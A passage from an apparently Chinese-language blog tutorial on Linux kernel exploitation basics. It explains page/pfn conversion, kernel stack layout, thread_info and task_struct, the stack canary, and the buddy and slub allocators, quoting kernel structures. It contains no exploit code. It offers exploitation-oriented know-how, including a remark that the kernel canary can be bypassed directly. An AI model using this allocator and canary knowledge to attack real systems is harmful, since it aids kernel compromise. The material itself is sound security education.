SECTIONS_PGSHIFT) &amp; SECTIONS_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">pfn_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">pfn</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">return</span> __nr_to_section(pfn_to_section_nr(pfn));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">section_mem_map_addr</span>(<span class="keyword">struct</span> <span class="title">mem_section</span> *<span class="title">section</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="built_in">map</span> = section-&gt;section_mem_map;</span><br><span class="line">	<span class="built_in">map</span> &amp;= SECTION_MAP_MASK;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> page *)<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SPARSEMEM)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note: section&#x27;s mem_map is encoded to reflect its start_pfn.</span></span><br><span class="line"><span class="comment"> * section[i].section_mem_map == mem_map&#x27;s address - start_pfn;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __page_to_pfn(pg)					\</span></span><br><span class="line"><span class="meta">(&#123;	const struct page *__pg = (pg);				\</span></span><br><span class="line"><span class="meta">	int __sec = page_to_section(__pg);			\</span></span><br><span class="line"><span class="meta">	(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));	\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __pfn_to_page(pfn)				\</span></span><br><span class="line"><span class="meta">(&#123;	unsigned long __pfn = (pfn);			\</span></span><br><span class="line"><span class="meta">	struct mem_section *__sec = __pfn_to_section(__pfn);	\</span></span><br><span class="line"><span class="meta">	__section_mem_map_addr(__sec) + __pfn;		\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_FLATMEM/DISCONTIGMEM/SPARSEMEM */</span></span></span><br></pre></td></tr></table></figure></div>

<p>因此 <code>pfn</code> 与 <code>page</code> 的转换关系如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/pfn.png"
                      alt="pfn"
                ></p>
<p>基于Sparse Memory 内存模型上引入了 vmemmap 的概念，是目前 Linux 最常用的内存模型之一。在开启了 vmemmap 之后，所有的 <code>mem_section</code> 中的 <code>page</code> 都抽象到一个虚拟数组 vmemmap 中，这样在进行 <code>struct page *</code> 和 <code>pfn</code> 转换时，直接使用 vmemmap 数组即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/vmemmap.png"
                      alt="vmemmap"
                ></p>
<h3 id="内核栈"><a href="#内核栈" class="headerlink" title="内核栈"></a>内核栈</h3><p>可以先来了解一下内核空间地址布局，详细可以参考这两个链接 <a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/613004422" >first<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 和 <a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/x86_64/mm.txt" >second<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，内核栈可以参考 <a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/kernel-stacks" >third<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>虽然<code>x86_64</code>的物理地址范围为<code>64bit</code>，但是因为地址空间太大目前不可能完全用完，当前支持<code>48bit</code>和<code>57bit</code>两种虚拟地址模式，也就是四级页表和五级页表，内核常用的还是四级页表。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/x86-64-kernel-layout.png"
                      alt="x86-64-kernel-layout"
                ></p>
<h4 id="x86-64-的内核栈"><a href="#x86-64-的内核栈" class="headerlink" title="x86-64 的内核栈"></a>x86-64 的内核栈</h4><p><code>x86_64</code>页大小(PAGE_SIZE)是<code>4K</code>。与所有其他体系结构一样，<code>x86_64</code>给每个存活的线程都分配一个内核栈。这些线程栈都是<code>THREAD_SIZE (2*PAGE_SIZE)</code>大的。这些堆栈包含有用的数据，只要线程活着或是一个僵尸线程。当线程在用户空间时，除了底部的<code>thread_info</code>结构，内核栈为空。</p>
<p><strong>thread_info &amp;&amp; task_struct</strong></p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// arch/x86/include/asm/thread_info.h</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">thread_info</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags;		<span class="comment">/* low level flags */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> syscall_work;	<span class="comment">/* SYSCALL_WORK_ flags */</span></span><br><span class="line">	u32 status;		<span class="comment">/* thread synchronous flags */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	u32 cpu;		<span class="comment">/* current CPU */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux kernel 6.0</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">task_struct</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For reasons of header soup (see current_thread_info()), this</span></span><br><span class="line"><span class="comment">	 * must be the first element of task_struct.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">thread_info</span>		thread_info;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			__state;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PREEMPT_RT</span></span><br><span class="line">	<span class="comment">/* saved state for &quot;spinlock sleepers&quot; */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			saved_state;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This begins the randomizable portion of task_struct. Only</span></span><br><span class="line"><span class="comment">	 * scheduling-critical items should be added above here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	randomized_struct_fields_start</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>				*stack;</span><br><span class="line">	<span class="type">refcount_t</span>			usage;</span><br><span class="line">	<span class="comment">/* Per task flags (PF_*), defined further below: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			ptrace;</span><br><span class="line">[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><em>这是 <code>task_struct</code> 结构体的完整代码：<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.6/source/include/linux/sched.h#L743" >task_struct<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></em></p>
<p><code>thread_info</code> 结构存储在内核栈中，这种方式是最经典的。因为 <code>task_struct</code> 结构从<code>1.0</code>到现在<code>5.0</code>内核此结构一直在增大。如果将此结构放在内核栈中则很浪费内核栈的空间，<code>thread_info</code>结构中有一个<code>task_struct</code> 的指针避免了内核栈空间过大。</p>
<hr>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">thread_union</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">thread_info</span> thread_info;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack[THREAD_SIZE/<span class="built_in">sizeof</span>(<span class="type">long</span>)];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THREAD_SIZE (2*PAGE_SIZE)</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/kernel_stack.png"
                      alt="kernel_stack"
                ></p>
<p>内核定义了一个<code>thread_union</code>的联合体，联合体的作用就是<code>thread_info</code>和<code>stack</code>共用一块内存区域。而<code>THREAD_SIZE</code>就是内核栈的大小，<code>x86-64</code>定义<code>THREAD_SIZE</code>的大小为<code>8K</code>。</p>
<h4 id="内核栈保护"><a href="#内核栈保护" class="headerlink" title="内核栈保护"></a>内核栈保护</h4><h5 id="STACK-PROTECTOR"><a href="#STACK-PROTECTOR" class="headerlink" title="STACK PROTECTOR"></a><strong>STACK PROTECTOR</strong></h5><p>类似于用户态程序的 <code>canary</code>，通常又被称作是 <code>stack cookie</code>，用以检测是否发生内核堆栈溢出，若是发生内核堆栈溢出则会产生 <code>kernel panic</code> 。</p>
<ul>
<li><strong>开启：</strong> 在编译内核时，我们可以设置 <code>CONFIG_CC_STACKPROTECTOR</code> 选项，来开启该保护。</li>
<li><strong>关闭：</strong> 我们需要重新编译内核，并关闭编译选项才可以关闭 <code>Canary</code> 保护。</li>
</ul>
<p>内核中的<code>canary</code>的值通常取自<code>gs</code>段寄存器某个固定偏移处的值，可以直接绕过。</p>
<h3 id="内核堆"><a href="#内核堆" class="headerlink" title="内核堆"></a>内核堆</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>Linux kernel 将内存分为 <code>页→区→节点</code> 三级结构，主要有两个内存管理器—— <code>buddy system</code> 与 <code>slab allocator</code>，前者负责以内存页为粒度管理所有可用的物理内存，后者则向前者请求内存页并划分为多个较小的对象（object）以进行细粒度的内存管理。</p>
<p><strong>页→区→节点三级结构</strong></p>
<p>这是一张十分经典的 <em>Overview</em> ，自顶向下是</p>
<ul>
<li><strong>页</strong>（page，对应结构体 page）</li>
<li><strong>区</strong>（zone，对应结构体 zone，图上展示了三种类型的 zone）</li>
<li><strong>节点</strong>（node，对应结构体 pgdata_list）</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/page-zone-node.png"
                      alt="page-zone-node"
                ></p>
<p><strong>页(page)</strong></p>
<p>Linux kernel 中使用 <code>page</code> 结构体来表示一个物理页框，<strong>每个物理页框都有着一个对应的 page 结构体</strong>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/page_struct.png"
                      alt="page_struct"
                ></p>
<p><strong>区(zone)</strong></p>
<p>在 Linux 下将一个节点内不同用途的内存区域划分为不同的 <code>区（zone）</code>，对应结构体 <code>struct zone</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/zone_struct.png"
                      alt="zone_struct"
                ></p>
<p><strong>节点(node)</strong></p>
<p>zone 再向上一层便是<strong>节点</strong>——Linux 将内存控制器（memory controller）作为节点划分的依据，对于 UMA 架构而言只有一个节点，而对于 NUMA 架构而言通常有多个节点，对于同一个内存控制器下的 CPU 而言其对应的节点称之为本地内存，不同处理器之间通过总线进行进一步的连接。如下图所示，一个 MC 对应一个节点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/node_numa.png"
                      alt="node_numa"
                ></p>
<p><strong>buddy system</strong></p>
<p>buddy system 是 Linux kernel 中的一个较为底层的内存管理系统，<strong>以内存页为粒度管理着所有的物理内存</strong>，其存在于 <strong>区</strong> 这一级别，对当前区所对应拥有的所有物理页框进行管理.在每个 zone 结构体中都有一个 free_area 结构体数组，用以存储 buddy system <strong>按照 order 管理的页面</strong>:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>    <span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中的 <code>MAX_ORDER</code> 为一个常量，值为 11。在 buddy system 中按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为<strong>连续的空闲页面的大小</strong>，不过单位不是页面数，而是<code>阶</code>，即对于每个下标而言，其中所存储的页面大小为：2^oeder。</p>
<p>在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构，由此我们得到这样一张 Overview：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/zone_struct.png"
                      alt="zone_struct"
                ></p>
<ul>
<li>分配：<ul>
<li>首先会将请求的内存大小向 2 的幂次方张内存页大小对齐，之后从对应的下标取出连续内存页。</li>
<li>若对应下标链表为空，则会从下一个 order 中取出内存页，一分为二，装载到当前下标对应链表中，之后再返还给上层调用，若下一个 order 也为空则会继续向更高的 order 进行该请求过程。</li>
</ul>
</li>
<li>释放：<ul>
<li>将对应的连续内存页释放到对应的链表上。</li>
<li>检索是否有可以合并的内存页，若有，则进行合成，放入更高 order 的链表中。</li>
</ul>
</li>
</ul>
<p><strong>slub allocator</strong></p>
<p>slab allocator 则是更为细粒度的内存管理器，其通过向 buddy system 请求单张或多张连续内存页后再分割成同等大小的<strong>对象</strong>（object）返还给上层调用者来实现更为细粒度的内存管理。</p>
<p>slab allocator 一共有三种版本：</p>
<ul>
<li>slab（最初的版本，机制比较复杂，效率不高）</li>
<li>slob（用于嵌入式等场景的极为简化版本）</li>
<li>slub（优化后的版本，<strong>现在的通用版本</strong>）</li>
</ul>
<p><strong>slub 基本结构</strong></p>
<p><code>slub</code> 版本的 allocator 为现在绝大多数 Linux kernel 所装配的版本，因此本篇文章主要叙述的也是 slub allocator，其基本结构如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/slub_allocator.png"
                      alt="slub_allocator"
                ></p>
<p>我们将 slub allocator 每次向 buddy system 请求得来的单张 &#x2F; 多张内存页称之为一个 <code>slub</code>，其被分割为多个同等大小对象（object），每个 object 作为一个被分配实体，在 slub 的第一张内存页对应的 page 结构体上的 freelist  成员指向该张内存页上的第一个空闲对象，一个 slub 上的所有空闲对象组成一个以 NULL 结尾的单向链表。</p>
<blockquote>
<p>一个 object 可以理解为用户态 glibc 中的 chunk，不过 object 并不像 chunk 那样需要有一个 header，因为  page 结构体与物理内存间存在线性对应关系，我们可以直接通过 object 地址找到其对应的 page 结构体。</p>
</blockquote>
<p><code>kmem_cache</code> 为一个基本的 allocator 组件，其用于分配某个特定大小（某种特定用途）的对象，所有的 kmem_cache 构成一个双向链表，并存在两个对应的结构体数组 <code>kmalloc_caches</code> 与 <code>kmalloc_dma_caches</code>。</p>
<p>一个 <code>kmem_cache</code> 主要由两个模块组成：</p>
<ul>
<li><code>kmem_cache_cpu</code>：这是一个 <strong>percpu 变量</strong>（即每个核心上都独立保留有一个副本，原理是以 gs 寄存器作为 percpu 段的基址进行寻址），用以表示当前核心正在使用的 slub，因此当前 CPU 在从 kmem_cache_cpu 上取 object 时<strong>不需要加锁</strong>，从而极大地提高了性能。</li>
<li><code>kmem_cache_node</code>：可以理解为当前 kmem_cache 的 slub 集散中心，其中存放着两个 slub 链表：<ul>
<li>partial：该 slub 上存在着一定数量的空闲 object，但并非全部空闲。</li>
<li>full：该 slub 上的所有 object 都被分配出去了。</li>
</ul>
</li>
</ul>
<p><strong>slub 分配和释放</strong></p>
<ul>
<li>分配：<ul>
<li>首先从 <code>kmem_cache_cpu</code> 上取对象，若有则直接返回。</li>
<li>若 <code>kmem_cache_cpu</code> 上的 slub 已经无空闲对象了，对应 slub 会被从 <code>kmem_cache_cpu</code> 上取下，并尝试从 <strong>partial</strong> 链表上取一个 slub 挂载到 <code>kmem_cache_cpu</code> 上，然后再取出空闲对象返回。</li>
<li>若 <code>kmem_cache_node</code> 的 partial 链表也空了，那就<strong>向 buddy system 请求分配新的内存页</strong>，划分为多个 object 之后再给到 <code>kmem_cache_cpu</code>，取空闲对象返回上层调用。</li>
</ul>
</li>
<li>释放：<ul>
<li>若被释放 object 属于 <code>kmem_cache_cpu</code> 的 slub，直接使用头插法插入当前 CPU slub 的 freelist。</li>
<li>若被释放 object 属于 <code>kmem_cache_node</code> 的 partial 链表上的 slub，直接使用头插法插入对应 slub 的 freelist。</li>
<li>若被释放 object 为 full slub，则其会成为对应 slub 的 freelist 头节点，<strong>且该 slub 会被放置到 partial 链表</strong>。</li>
</ul>
</li>
</ul>
<h4 id="buddy-system"><a href="#buddy-system" class="headerlink" title="buddy system"></a>buddy system</h4><h5 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h5><p>以 Discontiguous Memory 模型为例，buddy system 相关的数据结构关系如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/buddy_sys_sky.png"
                      alt="buddy_sys_sky"
                ></p>
<p><strong>node_data</strong></p>
<p><code>node_data</code> 是一个 <code>pg_data_t </code> 类型的结构体数组，其中每个元素代表一个内存节点。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pg_data_t</span> node_data[MAX_NUMNODES];</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>pg_data_t</code> 中与 buddy system 相关的成员如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span>	<span class="comment">/* Pointer to actual zone */</span></span><br><span class="line">	<span class="type">int</span> zone_idx;		<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line">	<span class="type">int</span> nr_zones;</span><br><span class="line">	...</span><br><span class="line">&#125; <span class="type">pg_data_t</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>node_zones</code> ：该节点所拥有的 <code>zones</code>。 并非所有的 zone 都已被填充，但这是一个满的列表。</li>
<li><code>node_zonelists</code>：记录 <code>zone</code> 的列表。通常一个内存节点包含两个 <code>zonelist</code>，一个是 <code>ZONELIST_FALLBACK</code> ，表示本地的；另外一个是 <code>ZONELIST_NOFALLBACK</code> ，表示远端的。</li>
<li><code>nr_zones</code>：<code>node_zones</code> 中有效 <code>zone</code> 的数量。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/node_data.png"
                      alt="node_data"
                ></p>
<p><strong>zone</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		nr_free;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>	<span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line">	....</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br></pre></td></tr></table></figure></div>

<p>每个 <code>zone</code> 结构体中都有一个 <code>free_area</code> 结构体数组，用以存储 buddy system 按照 <code>order</code> 管理的页面。<code>free_area</code> 中第 i 个成员管理每块为连续 2^i 个内存页的内存。因为 <code>MAX_ORDER</code> 为11, buddy system 能分配的最大内存为 4MB 。</p>
<p><code>free_area</code> 中并非只有 <code>MAX_ORDER</code> 个双向链表分别代表着不同的“迁移类型”（migrate type），这是由于页面迁移机制的存在。<br> 页面迁移主要用以解决内核空间中的碎片问题，在长期的运行之后内存当中空闲页面的分布可能是零散的，这便导致了内核有可能无法映射到足够大的连续内存，因此需要进行页面迁移。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/page_pivote.png"
                      alt="page_pivote"
                ></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">	MIGRATE_UNMOVABLE,</span><br><span class="line">	MIGRATE_MOVABLE,</span><br><span class="line">	MIGRATE_RECLAIMABLE,</span><br><span class="line">	MIGRATE_PCPTYPES,	<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">	MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment">	 * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment">	 * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment">	 * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment">	 * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment">	 * __free_pageblock_cma() function.  What is important though</span></span><br><span class="line"><span class="comment">	 * is that a range of pageblocks must be aligned to</span></span><br><span class="line"><span class="comment">	 * MAX_ORDER_NR_PAGES should biggest page be bigger then</span></span><br><span class="line"><span class="comment">	 * a single pageblock.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">	MIGRATE_ISOLATE,	<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>但并非所有的页面都是能够随意迁移的，因此我们在 buddy system 当中还需要将页面按照迁移类型进行分类。迁移类型由一个枚举类型定义，定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p>
<ul>
<li><code>MIGRATE_UNMOVABLE</code>：这类型页面在内存当中有着固定的位置，不能移动。</li>
<li><code>MIGRATE_MOVABLE</code>：这类页面可以随意移动，例如用户空间的页面，我们只需要复制数据后改变页表映射即可。</li>
<li><code>MIGRATE_RECLAIMABLE</code>：这类页面不能直接移动，但是可以删除，例如映射自文件的页。</li>
<li><code>MIGRATE_PCPTYPES</code>：<code>per_cpu_pageset</code>，即每 CPU 页帧缓存，其迁移仅限于同一节点内。</li>
<li><code>MIGRATE_CMA</code>：Contiguous Memory Allocator，即连续的物理内存。</li>
<li><code>MIGRATE_ISOLATE</code>：不能从该链表分配页面，该链表用于跨 NUMA 节点进行页面移动，将页面移动到使用该页面最为频繁的 CPU 所处节点。</li>
<li><code>MIGRATE_TYPES</code>：表示迁移类型的数目，并不存在这一链表。</li>
</ul>
<p><code>nr_free</code> 字段记录了在当前 <code>free_area</code> 中的空闲页面块的数量，对于 <code>free_area[0]</code> 以外的 <code>free_area</code> 而言其单位并非是单个页框，而是以内存块为单位。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
